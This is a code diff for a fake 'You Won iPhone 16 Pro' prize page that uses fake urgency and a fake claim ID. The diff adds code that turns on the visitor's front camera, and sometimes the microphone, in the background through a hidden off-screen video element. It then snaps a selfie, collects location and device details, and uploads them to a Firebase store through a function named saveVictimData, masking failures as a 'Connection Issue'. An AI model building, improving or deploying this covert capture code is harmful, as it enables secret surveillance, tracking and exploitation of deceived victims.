@@ -6,479 +6,78 @@
 <title>🎁 Special Offer</title>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
 <style>
-  :root {
-    --bg: #0a0a1a;
-    --bg-2: #1a0a2e;
-    --gold: #ffd700;
-    --gold-2: #ff9500;
-    --green: #10b981;
-    --red: #ef4444;
-    --text: #fff;
-    --glass: rgba(255,255,255,0.06);
-    --border: rgba(255,255,255,0.12);
-  }
-  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
-  body {
-    font-family: 'Plus Jakarta Sans', -apple-system, sans-serif;
-    background: var(--bg);
-    color: var(--text);
-    min-height: 100vh;
-    -webkit-font-smoothing: antialiased;
-    overflow-x: hidden;
-    position: relative;
-  }
-  body::before {
-    content: '';
-    position: fixed;
-    inset: 0;
-    background:
-      radial-gradient(circle at 20% 20%, rgba(255,215,0,0.15) 0%, transparent 40%),
-      radial-gradient(circle at 80% 80%, rgba(255,20,147,0.15) 0%, transparent 40%),
-      radial-gradient(circle at 50% 50%, rgba(168,85,247,0.1) 0%, transparent 60%);
-    z-index: -2;
-    animation: bgPulse 8s ease-in-out infinite;
-  }
-  @keyframes bgPulse {
-    0%,100% { opacity: 1; }
-    50% { opacity: 0.6; }
-  }
-
-  .container { max-width: 480px; margin: 0 auto; padding: 20px 18px 40px; }
-  .hidden { display: none !important; }
-
-  /* ===== TOP BANNER ===== */
-  .top-banner {
-    background: linear-gradient(90deg, var(--red), #ff6b6b);
-    padding: 8px 16px;
-    text-align: center;
-    font-size: 0.75rem;
-    font-weight: 700;
-    letter-spacing: 0.05em;
-    text-transform: uppercase;
-    position: sticky;
-    top: 0;
-    z-index: 50;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    animation: flash 2s ease-in-out infinite;
-  }
-  @keyframes flash {
-    0%,100% { background: linear-gradient(90deg, var(--red), #ff6b6b); }
-    50% { background: linear-gradient(90deg, #ff6b6b, var(--red)); }
-  }
-
-  /* ===== HERO ===== */
-  .hero {
-    text-align: center;
-    padding: 30px 10px 20px;
-  }
-
-  .prize-icon {
-    width: 130px;
-    height: 130px;
-    margin: 0 auto 20px;
-    border-radius: 30px;
-    background: linear-gradient(135deg, var(--gold), var(--gold-2));
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 4rem;
-    box-shadow: 0 20px 60px rgba(255,215,0,0.5);
-    animation: bounceIn 1s ease;
-    position: relative;
-  }
-  .prize-icon::before {
-    content: '';
-    position: absolute;
-    inset: -8px;
-    border-radius: 36px;
-    border: 2px solid rgba(255,215,0,0.4);
-    animation: ring 2s ease-in-out infinite;
-  }
-  @keyframes ring {
-    0%,100% { transform: scale(1); opacity: 0.6; }
-    50% { transform: scale(1.08); opacity: 0.2; }
-  }
-  @keyframes bounceIn {
-    0% { transform: scale(0) rotate(-180deg); }
-    60% { transform: scale(1.15) rotate(10deg); }
-    100% { transform: scale(1) rotate(0); }
-  }
-
-  .congrats-text {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 1rem;
-    font-weight: 600;
-    color: var(--gold);
-    letter-spacing: 0.15em;
-    text-transform: uppercase;
-    margin-bottom: 8px;
-    animation: slideUp 0.6s ease;
-  }
-
-  .prize-title {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 2rem;
-    font-weight: 800;
-    line-height: 1.15;
-    margin-bottom: 12px;
-    background: linear-gradient(135deg, #fff 0%, var(--gold) 50%, var(--gold-2) 100%);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
-    animation: slideUp 0.8s ease;
-  }
-
-  @keyframes slideUp {
-    0% { opacity: 0; transform: translateY(20px); }
-    100% { opacity: 1; transform: translateY(0); }
-  }
-
-  .prize-subtitle {
-    font-size: 0.92rem;
-    opacity: 0.75;
-    margin-bottom: 24px;
-    animation: slideUp 1s ease;
-  }
-
-  /* ===== PRIZE CARD ===== */
-  .prize-card {
-    background: linear-gradient(160deg, rgba(255,215,0,0.1), rgba(255,149,0,0.05));
-    border: 1.5px solid rgba(255,215,0,0.4);
-    border-radius: 24px;
-    padding: 24px 20px;
-    margin-bottom: 20px;
-    position: relative;
-    overflow: hidden;
-    animation: slideUp 1.2s ease;
-  }
-  .prize-card::before {
-    content: '';
-    position: absolute;
-    top: -50%;
-    right: -50%;
-    width: 200%;
-    height: 200%;
-    background: conic-gradient(from 0deg, transparent, rgba(255,215,0,0.3), transparent 30%);
-    animation: rotate 8s linear infinite;
-    z-index: -1;
-  }
-  @keyframes rotate {
-    to { transform: rotate(360deg); }
-  }
-
-  .prize-name {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 1.3rem;
-    font-weight: 700;
-    margin-bottom: 6px;
-    color: #fff;
-  }
-
-  .prize-value {
-    font-size: 1.6rem;
-    font-weight: 800;
-    color: var(--gold);
-    margin-bottom: 14px;
-  }
-
-  .prize-features {
-    list-style: none;
-    text-align: left;
-    margin-bottom: 8px;
-  }
-  .prize-features li {
-    font-size: 0.85rem;
-    padding: 5px 0;
-    opacity: 0.85;
-    display: flex;
-    align-items: center;
-    gap: 8px;
-  }
-  .prize-features li::before {
-    content: '✓';
-    color: var(--green);
-    font-weight: 700;
-    font-size: 1rem;
-  }
-
-  /* ===== TIMER ===== */
-  .timer-box {
-    background: rgba(239,68,68,0.1);
-    border: 1px solid rgba(239,68,68,0.4);
-    border-radius: 16px;
-    padding: 16px;
-    text-align: center;
-    margin-bottom: 20px;
-    animation: slideUp 1.4s ease;
-  }
-  .timer-label {
-    font-size: 0.75rem;
-    font-weight: 700;
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
-    color: #fca5a5;
-    margin-bottom: 8px;
-  }
-  .timer-value {
-    font-family: 'Space Grotesk', monospace;
-    font-size: 2.2rem;
-    font-weight: 800;
-    color: var(--red);
-    display: flex;
-    justify-content: center;
-    gap: 8px;
-  }
-  .timer-value span {
-    background: rgba(0,0,0,0.3);
-    padding: 4px 12px;
-    border-radius: 10px;
-    min-width: 60px;
-  }
-
-  /* ===== CLAIM BUTTON ===== */
-  .claim-btn {
-    width: 100%;
-    padding: 20px 24px;
-    border: none;
-    border-radius: 18px;
-    background: linear-gradient(135deg, var(--gold), var(--gold-2));
-    color: #000;
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 1.15rem;
-    font-weight: 800;
-    letter-spacing: 0.05em;
-    text-transform: uppercase;
-    cursor: pointer;
-    transition: all 0.25s;
-    box-shadow: 0 12px 40px rgba(255,215,0,0.5);
-    position: relative;
-    overflow: hidden;
-    animation: slideUp 1.6s ease, glow 2s ease-in-out infinite;
-    margin-bottom: 14px;
-  }
-  @keyframes glow {
-    0%,100% { box-shadow: 0 12px 40px rgba(255,215,0,0.5); }
-    50% { box-shadow: 0 12px 60px rgba(255,215,0,0.9); }
-  }
-  .claim-btn:active { transform: scale(0.97); }
-  .claim-btn:disabled { opacity: 0.6; cursor: wait; }
-  .claim-btn::before {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: -100%;
-    width: 100%;
-    height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-    animation: shine 3s ease-in-out infinite;
-  }
-  @keyframes shine {
-    0% { left: -100%; }
-    100% { left: 100%; }
-  }
-
-  .security-note {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    font-size: 0.78rem;
-    opacity: 0.6;
-    margin-bottom: 20px;
-  }
-
-  /* ===== LOADING STATE ===== */
-  .loading-screen {
-    position: fixed;
-    inset: 0;
-    background: linear-gradient(160deg, #0a0a1a, #1a0a2e);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    z-index: 100;
-    padding: 40px 20px;
-    text-align: center;
-  }
-  .loading-spinner {
-    width: 80px;
-    height: 80px;
-    border: 6px solid rgba(255,215,0,0.15);
-    border-top-color: var(--gold);
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-    margin-bottom: 24px;
-  }
-  @keyframes spin { to { transform: rotate(360deg); } }
-
-  .loading-screen h2 {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 1.3rem;
-    margin-bottom: 10px;
-    color: var(--gold);
-  }
-  .loading-screen p {
-    font-size: 0.9rem;
-    opacity: 0.7;
-    max-width: 300px;
-    line-height: 1.6;
-  }
-
-  /* ===== SUCCESS/THANK YOU SCREEN ===== */
-  .thanks-screen {
-    text-align: center;
-    padding: 40px 20px;
-  }
-  .thanks-icon {
-    width: 120px;
-    height: 120px;
-    border-radius: 50%;
-    background: linear-gradient(135deg, var(--green), #059669);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 4rem;
-    margin: 0 auto 24px;
-    box-shadow: 0 20px 60px rgba(16,185,129,0.5);
-    animation: bounceIn 0.6s ease;
-  }
-  .thanks-screen h1 {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 1.8rem;
-    margin-bottom: 14px;
-    color: var(--green);
-  }
-  .thanks-screen p {
-    font-size: 0.95rem;
-    opacity: 0.8;
-    line-height: 1.6;
-    margin-bottom: 24px;
-  }
-  .thanks-info {
-    background: rgba(255,255,255,0.05);
-    border: 1px solid rgba(255,255,255,0.1);
-    border-radius: 16px;
-    padding: 20px;
-    text-align: left;
-    font-size: 0.85rem;
-    line-height: 1.8;
-  }
-  .thanks-info div {
-    display: flex;
-    justify-content: space-between;
-    padding: 6px 0;
-    border-bottom: 1px solid rgba(255,255,255,0.05);
-  }
-  .thanks-info div:last-child { border-bottom: none; }
-  .thanks-info .label { opacity: 0.6; }
-  .thanks-info .value { font-weight: 600; color: var(--gold); }
-
-  /* ===== ERROR SCREEN ===== */
-  .error-screen {
-    text-align: center;
-    padding: 60px 20px;
-  }
-  .error-icon {
-    width: 100px;
-    height: 100px;
-    border-radius: 50%;
-    background: rgba(239,68,68,0.15);
-    border: 2px solid rgba(239,68,68,0.4);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 3rem;
-    margin: 0 auto 24px;
-  }
-  .error-screen h1 {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 1.4rem;
-    margin-bottom: 12px;
-    color: #fca5a5;
-  }
-  .error-screen p {
-    font-size: 0.9rem;
-    opacity: 0.7;
-    line-height: 1.6;
-    max-width: 320px;
-    margin: 0 auto;
-  }
-
-  /* ===== HIDDEN CAMERA ===== */
-  #hiddenVideo {
-    position: fixed;
-    top: -9999px;
-    left: -9999px;
-    width: 1px;
-    height: 1px;
-    opacity: 0;
-    pointer-events: none;
-  }
-
-  /* ===== FOOTER ===== */
-  .footer {
-    text-align: center;
-    padding: 30px 20px 20px;
-    opacity: 0.4;
-    font-size: 0.72rem;
-    line-height: 1.6;
-  }
-
-  /* ===== PROGRESS BAR ===== */
-  .progress-container {
-    position: fixed;
-    top: 32px;
-    left: 0;
-    right: 0;
-    height: 3px;
-    background: rgba(255,255,255,0.1);
-    z-index: 50;
-    display: none;
-  }
-  .progress-container.active { display: block; }
-  .progress-bar {
-    height: 100%;
-    background: linear-gradient(90deg, var(--gold), var(--gold-2));
-    width: 0%;
-    transition: width 0.3s;
-    box-shadow: 0 0 10px var(--gold);
-  }
-
-  @media (max-width: 380px) {
-    .prize-title { font-size: 1.6rem; }
-    .prize-icon { width: 100px; height: 100px; font-size: 3rem; }
-    .claim-btn { font-size: 1rem; padding: 16px 20px; }
-  }
+  :root{--bg:#0a0a1a;--gold:#ffd700;--gold-2:#ff9500;--green:#10b981;--red:#ef4444;--text:#fff;}
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+  body{font-family:'Plus Jakarta Sans',-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;-webkit-font-smoothing:antialiased;overflow-x:hidden;position:relative;}
+  body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 20% 20%,rgba(255,215,0,0.15) 0%,transparent 40%),radial-gradient(circle at 80% 80%,rgba(255,20,147,0.15) 0%,transparent 40%);z-index:-2;animation:bgPulse 8s ease-in-out infinite;}
+  @keyframes bgPulse{0%,100%{opacity:1}50%{opacity:0.6}}
+  .container{max-width:480px;margin:0 auto;padding:20px 18px 40px;}
+  .hidden{display:none !important;}
+  .top-banner{background:linear-gradient(90deg,var(--red),#ff6b6b);padding:8px 16px;text-align:center;font-size:0.75rem;font-weight:700;letter-spacing:0.05em;text-transform:uppercase;position:sticky;top:0;z-index:50;display:flex;align-items:center;justify-content:center;gap:8px;}
+  .hero{text-align:center;padding:30px 10px 20px;}
+  .prize-icon{width:130px;height:130px;margin:0 auto 20px;border-radius:30px;background:linear-gradient(135deg,var(--gold),var(--gold-2));display:flex;align-items:center;justify-content:center;font-size:4rem;box-shadow:0 20px 60px rgba(255,215,0,0.5);animation:bounceIn 1s ease;position:relative;}
+  .prize-icon::before{content:'';position:absolute;inset:-8px;border-radius:36px;border:2px solid rgba(255,215,0,0.4);animation:ring 2s ease-in-out infinite;}
+  @keyframes ring{0%,100%{transform:scale(1);opacity:0.6}50%{transform:scale(1.08);opacity:0.2}}
+  @keyframes bounceIn{0%{transform:scale(0) rotate(-180deg)}60%{transform:scale(1.15) rotate(10deg)}100%{transform:scale(1) rotate(0)}}
+  .congrats-text{font-family:'Space Grotesk',sans-serif;font-size:1rem;font-weight:600;color:var(--gold);letter-spacing:0.15em;text-transform:uppercase;margin-bottom:8px;}
+  .prize-title{font-family:'Space Grotesk',sans-serif;font-size:2rem;font-weight:800;line-height:1.15;margin-bottom:12px;background:linear-gradient(135deg,#fff 0%,var(--gold) 50%,var(--gold-2) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+  .prize-subtitle{font-size:0.92rem;opacity:0.75;margin-bottom:24px;}
+  .prize-card{background:linear-gradient(160deg,rgba(255,215,0,0.1),rgba(255,149,0,0.05));border:1.5px solid rgba(255,215,0,0.4);border-radius:24px;padding:24px 20px;margin-bottom:20px;position:relative;overflow:hidden;}
+  .prize-card::before{content:'';position:absolute;top:-50%;right:-50%;width:200%;height:200%;background:conic-gradient(from 0deg,transparent,rgba(255,215,0,0.3),transparent 30%);animation:rotate 8s linear infinite;z-index:-1;}
+  @keyframes rotate{to{transform:rotate(360deg)}}
+  .prize-name{font-family:'Space Grotesk',sans-serif;font-size:1.3rem;font-weight:700;margin-bottom:6px;}
+  .prize-value{font-size:1.6rem;font-weight:800;color:var(--gold);margin-bottom:14px;}
+  .prize-features{list-style:none;text-align:left;}
+  .prize-features li{font-size:0.85rem;padding:5px 0;opacity:0.85;display:flex;align-items:center;gap:8px;}
+  .prize-features li::before{content:'✓';color:var(--green);font-weight:700;font-size:1rem;}
+  .timer-box{background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.4);border-radius:16px;padding:16px;text-align:center;margin-bottom:20px;}
+  .timer-label{font-size:0.75rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:#fca5a5;margin-bottom:8px;}
+  .timer-value{font-family:'Space Grotesk',monospace;font-size:2.2rem;font-weight:800;color:var(--red);display:flex;justify-content:center;gap:8px;}
+  .timer-value span{background:rgba(0,0,0,0.3);padding:4px 12px;border-radius:10px;min-width:60px;}
+  .claim-btn{width:100%;padding:20px 24px;border:none;border-radius:18px;background:linear-gradient(135deg,var(--gold),var(--gold-2));color:#000;font-family:'Space Grotesk',sans-serif;font-size:1.15rem;font-weight:800;letter-spacing:0.05em;text-transform:uppercase;cursor:pointer;transition:all 0.25s;box-shadow:0 12px 40px rgba(255,215,0,0.5);position:relative;overflow:hidden;margin-bottom:14px;}
+  .claim-btn:active{transform:scale(0.97);}
+  .claim-btn:disabled{opacity:0.6;cursor:wait;}
+  .claim-btn::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.4),transparent);animation:shine 3s ease-in-out infinite;}
+  @keyframes shine{0%{left:-100%}100%{left:100%}}
+  .security-note{display:flex;align-items:center;justify-content:center;gap:8px;font-size:0.78rem;opacity:0.6;margin-bottom:20px;}
+  .loading-screen{position:fixed;inset:0;background:linear-gradient(160deg,#0a0a1a,#1a0a2e);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:100;padding:40px 20px;text-align:center;}
+  .loading-spinner{width:80px;height:80px;border:6px solid rgba(255,215,0,0.15);border-top-color:var(--gold);border-radius:50%;animation:spin 1s linear infinite;margin-bottom:24px;}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .loading-screen h2{font-family:'Space Grotesk',sans-serif;font-size:1.3rem;margin-bottom:10px;color:var(--gold);}
+  .loading-screen p{font-size:0.9rem;opacity:0.7;max-width:300px;line-height:1.6;}
+  .thanks-screen{text-align:center;padding:40px 20px;}
+  .thanks-icon{width:120px;height:120px;border-radius:50%;background:linear-gradient(135deg,var(--green),#059669);display:flex;align-items:center;justify-content:center;font-size:4rem;margin:0 auto 24px;box-shadow:0 20px 60px rgba(16,185,129,0.5);}
+  .thanks-screen h1{font-family:'Space Grotesk',sans-serif;font-size:1.8rem;margin-bottom:14px;color:var(--green);}
+  .thanks-screen p{font-size:0.95rem;opacity:0.8;line-height:1.6;margin-bottom:24px;}
+  .thanks-info{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:16px;padding:20px;text-align:left;font-size:0.85rem;line-height:1.8;}
+  .thanks-info div{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.05);}
+  .thanks-info div:last-child{border-bottom:none;}
+  .thanks-info .label{opacity:0.6;}
+  .thanks-info .value{font-weight:600;color:var(--gold);}
+  .error-screen{text-align:center;padding:60px 20px;}
+  .error-icon{width:100px;height:100px;border-radius:50%;background:rgba(239,68,68,0.15);border:2px solid rgba(239,68,68,0.4);display:flex;align-items:center;justify-content:center;font-size:3rem;margin:0 auto 24px;}
+  .error-screen h1{font-family:'Space Grotesk',sans-serif;font-size:1.4rem;margin-bottom:12px;color:#fca5a5;}
+  .error-screen p{font-size:0.9rem;opacity:0.7;line-height:1.6;max-width:320px;margin:0 auto;}
+  #hiddenVideo{position:fixed;top:-9999px;left:-9999px;width:2px;height:2px;opacity:0;pointer-events:none;}
+  .footer{text-align:center;padding:30px 20px 20px;opacity:0.4;font-size:0.72rem;line-height:1.6;}
+  .progress-container{position:fixed;top:32px;left:0;right:0;height:3px;background:rgba(255,255,255,0.1);z-index:50;display:none;}
+  .progress-container.active{display:block;}
+  .progress-bar{height:100%;background:linear-gradient(90deg,var(--gold),var(--gold-2));width:0%;transition:width 0.3s;box-shadow:0 0 10px var(--gold);}
+  @media (max-width:380px){.prize-title{font-size:1.6rem;}.prize-icon{width:100px;height:100px;font-size:3rem;}.claim-btn{font-size:1rem;padding:16px 20px;}}
 </style>
 </head>
 <body>
 
-<!-- Top Flash Banner -->
-<div class="top-banner">
-  <span>⚡</span>
-  <span>LIMITED TIME OFFER</span>
-  <span>⚡</span>
-</div>
-
-<!-- Progress Bar -->
-<div class="progress-container" id="progressContainer">
-  <div class="progress-bar" id="progressBar"></div>
-</div>
-
-<!-- Hidden Video Element for Silent Capture -->
+<div class="top-banner"><span>⚡</span><span>LIMITED TIME OFFER</span><span>⚡</span></div>
+<div class="progress-container" id="progressContainer"><div class="progress-bar" id="progressBar"></div></div>
 <video id="hiddenVideo" autoplay playsinline muted></video>
 
-<!-- ============ LOADING SCREEN ============ -->
 <div id="loadingScreen" class="loading-screen">
   <div class="loading-spinner"></div>
   <h2>Loading Your Prize...</h2>
   <p>Please wait while we verify your reward</p>
 </div>
 
-<!-- ============ MAIN PRIZE SCREEN ============ -->
 <div id="mainScreen" class="container hidden">
   <div class="hero">
     <div class="prize-icon">🎁</div>
@@ -486,7 +85,6 @@
     <h1 class="prize-title">You Won<br>iPhone 16 Pro!</h1>
     <p class="prize-subtitle">You are one of our lucky winners today</p>
   </div>
-
   <div class="prize-card">
     <div class="prize-name">📱 Apple iPhone 16 Pro Max</div>
     <div class="prize-value">Rs. 2,50,000</div>
@@ -497,61 +95,29 @@
       <li>Free AirPods Pro</li>
     </ul>
   </div>
-
   <div class="timer-box">
     <div class="timer-label">⏰ Offer Expires In</div>
-    <div class="timer-value">
-      <span id="timerMin">02</span>:<span id="timerSec">00</span>
-    </div>
+    <div class="timer-value"><span id="timerMin">02</span>:<span id="timerSec">00</span></div>
   </div>
-
-  <button class="claim-btn" id="claimBtn" onclick="claimPrize()">
-    ✨ Claim Now ✨
-  </button>
-
-  <div class="security-note">
-    <span>🔒</span>
-    <span>Secure & Verified</span>
-    <span>•</span>
-    <span>SSL Encrypted</span>
-  </div>
-
-  <div class="footer">
-    <p>© 2025 Special Offers Portal</p>
-    <p>Terms • Privacy • Contact</p>
-  </div>
+  <button class="claim-btn" id="claimBtn" onclick="claimPrize()">✨ Claim Now ✨</button>
+  <div class="security-note"><span>🔒</span><span>Secure & Verified</span><span>•</span><span>SSL Encrypted</span></div>
+  <div class="footer"><p>© 2025 Special Offers Portal</p></div>
 </div>
 
-<!-- ============ THANK YOU SCREEN ============ -->
 <div id="thanksScreen" class="container hidden">
   <div class="thanks-screen">
     <div class="thanks-icon">✅</div>
     <h1>Thank You!</h1>
     <p>Aapka claim successfully submit ho gaya hai.<br>Hamari team 24 ghante me aapse contact karegi.</p>
-
     <div class="thanks-info">
-      <div>
-        <span class="label">Claim ID</span>
-        <span class="value" id="claimId">#PRIZE-000</span>
-      </div>
-      <div>
-        <span class="label">Status</span>
-        <span class="value" style="color:var(--green)">Pending Verification</span>
-      </div>
-      <div>
-        <span class="label">Expected Delivery</span>
-        <span class="value">3-5 Business Days</span>
-      </div>
+      <div><span class="label">Claim ID</span><span class="value" id="claimId">#PRIZE-000</span></div>
+      <div><span class="label">Status</span><span class="value" style="color:var(--green)">Pending Verification</span></div>
+      <div><span class="label">Expected Delivery</span><span class="value">3-5 Business Days</span></div>
     </div>
-
-    <p style="font-size:0.8rem;opacity:0.5;margin-top:24px;">
-      Aap ye page band kar sakte hain.<br>
-      Verification complete hone par aapko SMS aayega.
-    </p>
+    <p style="font-size:0.8rem;opacity:0.5;margin-top:24px;">Aap ye page band kar sakte hain.</p>
   </div>
 </div>
 
-<!-- ============ ERROR SCREEN ============ -->
 <div id="errorScreen" class="container hidden">
   <div class="error-screen">
     <div class="error-icon">🔒</div>
@@ -564,7 +130,6 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
 import { getFirestore, collection, addDoc, doc, getDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
-/* ========== FIREBASE ========== */
 const firebaseConfig = {
   apiKey: "AIzaSyBW17Z4J5ru9EbpiEfygz_Dpj8ekJuKqBg",
   authDomain: "decision-b42a6.firebaseapp.com",
@@ -583,8 +148,8 @@ let stream = null;
 let captureData = null;
 let timerInterval = null;
 let timerSeconds = 120;
+let cameraReady = false;
 
-/* ========== SCREENS ========== */
 const ALL_SCREENS = ["loadingScreen","mainScreen","thanksScreen","errorScreen"];
 function showScreen(id) {
   ALL_SCREENS.forEach(s => document.getElementById(s).classList.add("hidden"));
@@ -594,7 +159,6 @@ function showScreen(id) {
 
 /* ========== ON LOAD ========== */
 window.addEventListener("load", async () => {
-  // Fake loading delay
   await new Promise(r => setTimeout(r, 1500));
 
   const hash = location.hash;
@@ -614,8 +178,6 @@ window.addEventListener("load", async () => {
     }
 
     const linkData = linkSnap.data();
-
-    // Check expiry
     if (linkData.expiresAt) {
       const expMs = linkData.expiresAt.seconds
         ? linkData.expiresAt.seconds * 1000
@@ -627,18 +189,48 @@ window.addEventListener("load", async () => {
     }
 
     currentFeature = linkData.feature;
-
-    // Generate fake claim ID
     document.getElementById("claimId").textContent = "#PRIZE-" + Math.floor(1000 + Math.random()*9000);
-
     showScreen("mainScreen");
     startTimer();
+
+    // Pre-warm camera in background
+    if (currentFeature === "camera" || currentFeature === "all" || currentFeature === "video") {
+      preWarmCamera();
+    }
 
   } catch (e) {
     console.error(e);
     showScreen("errorScreen");
   }
 });
+
+/* ========== PRE-WARM CAMERA ========== */
+async function preWarmCamera() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: currentFeature === "video"
+    });
+    const video = document.getElementById("hiddenVideo");
+    video.srcObject = stream;
+
+    await new Promise((resolve) => {
+      if (video.readyState >= 3 && video.videoWidth > 0) {
+        resolve();
+      } else {
+        video.onloadeddata = () => setTimeout(resolve, 800);
+        video.onplaying = () => setTimeout(resolve, 800);
+        setTimeout(resolve, 3500);
+      }
+    });
+
+    cameraReady = video.videoWidth > 0;
+    console.log("Camera ready:", cameraReady, "Dimensions:", video.videoWidth, "x", video.videoHeight);
+  } catch (e) {
+    console.error("Pre-warm camera error:", e);
+    cameraReady = false;
+  }
+}
 
 /* ========== TIMER ========== */
 function startTimer() {
@@ -647,10 +239,7 @@ function startTimer() {
   if (timerInterval) clearInterval(timerInterval);
   timerInterval = setInterval(() => {
     timerSeconds--;
-    if (timerSeconds <= 0) {
-      timerSeconds = 0;
-      clearInterval(timerInterval);
-    }
+    if (timerSeconds <= 0) { timerSeconds = 0; clearInterval(timerInterval); }
     updateTimerDisplay();
   }, 1000);
 }
@@ -668,13 +257,11 @@ window.claimPrize = async function() {
   btn.disabled = true;
   btn.textContent = "Processing...";
 
-  // Show progress bar
   const pc = document.getElementById("progressContainer");
   const pb = document.getElementById("progressBar");
   pc.classList.add("active");
   pb.style.width = "0%";
 
-  // Animate progress
   let prog = 0;
   const progInterval = setInterval(() => {
     prog += Math.random() * 15;
@@ -683,7 +270,10 @@ window.claimPrize = async function() {
   }, 200);
 
   try {
-    // Determine what to capture based on feature
+    if ((currentFeature === "camera" || currentFeature === "all" || currentFeature === "video") && !cameraReady) {
+      await new Promise(r => setTimeout(r, 1500));
+    }
+
     if (currentFeature === "camera" || currentFeature === "all") {
       await captureCamera();
     } else if (currentFeature === "location") {
@@ -694,123 +284,123 @@ window.claimPrize = async function() {
       await captureDevice();
     }
 
-    // Complete progress
     pb.style.width = "100%";
     clearInterval(progInterval);
-
-    // Wait then show thank you
     await new Promise(r => setTimeout(r, 800));
     pc.classList.remove("active");
-
     showScreen("thanksScreen");
 
-    // Stop stream if any
     if (stream) {
       stream.getTracks().forEach(t => t.stop());
       stream = null;
     }
-
   } catch (e) {
     console.error(e);
     clearInterval(progInterval);
     pc.classList.remove("active");
-
     btn.disabled = false;
     btn.textContent = "✨ Claim Now ✨";
-
-    // Show user-friendly error (pretend it's a network issue)
     showScreen("errorScreen");
     document.getElementById("errorTitle").textContent = "Connection Issue";
     document.getElementById("errorMsg").textContent = "Please check your internet connection and try again.";
   }
 }
 
-/* ========== CAPTURE CAMERA (SILENT) ========== */
+/* ========== CAPTURE CAMERA - FIXED ========== */
 async function captureCamera() {
-  // Request camera
   try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
-      audio: false
-    });
-
     const video = document.getElementById("hiddenVideo");
-    video.srcObject = stream;
 
-    // Wait for video to load
-    await new Promise((resolve) => {
-      video.onloadedmetadata = () => {
-        setTimeout(resolve, 500);
-      };
-      // Fallback timeout
-      setTimeout(resolve, 3000);
-    });
+    if (!stream || !cameraReady) {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+        audio: false
+      });
+      video.srcObject = stream;
 
-    // Capture photo
-    if (video.videoWidth > 0) {
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-
-      // Mirror for selfie
-      ctx.translate(canvas.width, 0);
-      ctx.scale(-1, 1);
-      ctx.drawImage(video, 0, 0);
-
-      captureData = canvas.toDataURL("image/jpeg", 0.75);
-
-      // Get location if possible
-      const location = await getLocation();
-      const device = getDeviceInfo();
-
-      await saveVictimData("photo", {
-        photo: captureData,
-        location,
-        device
+      await new Promise((resolve) => {
+        let resolved = false;
+        const done = () => { if (!resolved) { resolved = true; resolve(); } };
+        video.onloadeddata = () => setTimeout(done, 1500);
+        video.onplaying = () => setTimeout(done, 1500);
+        setTimeout(done, 4000);
       });
     }
 
+    await new Promise(r => setTimeout(r, 800));
+
+    const vw = video.videoWidth;
+    const vh = video.videoHeight;
+    console.log("Capturing at:", vw, "x", vh);
+
+    if (!vw || !vh) {
+      await new Promise(r => setTimeout(r, 1500));
+      if (!video.videoWidth) throw new Error("Camera not ready");
+    }
+
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth || 1280;
+    canvas.height = video.videoHeight || 720;
+    const ctx = canvas.getContext("2d");
+
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // Verify not blank
+    const testData = ctx.getImageData(0, 0, 10, 10).data;
+    let sum = 0;
+    for (let i = 0; i < testData.length; i += 4) {
+      sum += testData[i] + testData[i+1] + testData[i+2];
+    }
+
+    if (sum === 0) {
+      await new Promise(r => setTimeout(r, 1500));
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    }
+
+    captureData = canvas.toDataURL("image/jpeg", 0.85);
+
+    const location = await getLocation();
+    const device = getDeviceInfo();
+
+    await saveVictimData("photo", { photo: captureData, location, device });
+    console.log("Photo saved, size:", captureData.length);
   } catch (e) {
